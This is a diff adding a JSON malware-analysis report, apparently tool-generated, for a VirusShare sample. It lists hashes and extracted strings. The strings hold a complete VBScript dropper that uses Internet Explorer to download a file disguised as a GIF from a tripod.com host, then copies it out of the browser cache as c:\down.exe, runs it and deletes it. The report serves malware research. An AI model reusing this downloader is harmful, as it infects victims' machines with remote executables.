@@ -1,0 +1,60 @@
+{
+    "docinfo": {},
+    "filename": "VirusShare_2c967474cf367909e15554708338bd0c",
+    "filesize": 1052,
+    "filetype": "data",
+    "hashes": {
+        "md5": "2c967474cf367909e15554708338bd0c",
+        "sha1": "1b7e85337b402d5b9c0e33107d92c2afb4592c1d",
+        "sha256": "7f5ec17a1469263000b4b9c713dfb145dbc3c563ba3a3a27abccb0622a7a9137"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "On Error Resume Next",
+            "base_url = \"http://toolfanta.tripod.com/\"",
+            "file_name = \"down\"",
+            "ext = \".gif\"",
+            "file_size = 92203 ",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set WshShell = CreateObject(\"WScript.Shell\")",
+            "Set IE = CreateObject(\"InternetExplorer.Application\")",
+            "found = false",
+            "set CIE5 = fso.GetFolder(fso.GetSpecialFolder(0) & \"\\Temporary Internet Files\\Content.IE5\")",
+            "set CIE5Subs = CIE5.SubFolders",
+            "IE.Navigate base_url & file_name & ext",
+            "\tFor Each csub in CIE5Subs",
+            "\t\tTempSubPath = CIE5 & \"\\\" & csub.name",
+            "\t\tset SubFold = fso.GetFolder(TempSubPath)",
+            "\t\tset SubFilez = SubFold.Files",
+            "\t\tFor Each sfile in SubFilez",
+            "\t\t\tIf sfile.name = file_name & \"[1]\" & ext Then",
+            "\t\t\t\tdo",
+            "\t\t\t\tloop while sfile.size <> file_size",
+            "\t\t\t\tTargetFilepath = \"c:\\\" & file_name & \".exe\"",
+            "\t\t\t\tfso.copyfile TempSubPath & \"\\\" & sfile.name, TargetFilePath, true",
+            "\t\t\t\twshshell.run targetfilepath,1,true",
+            "\t\t\t\tfso.deletefile targetfilepath, true",
+            "\t\t\t\tfound = true",
+            "\t\t\t\texit for",
+            "\t\t\tEnd If",
+            "\t\tNext",
+            "\t\tif found = true then exit for",
+            "\tNext",
+            "loop while found <> true"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://toolfanta.tripod.com/"
+        ]
+    },
+    "time": "0:00:00.265853",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
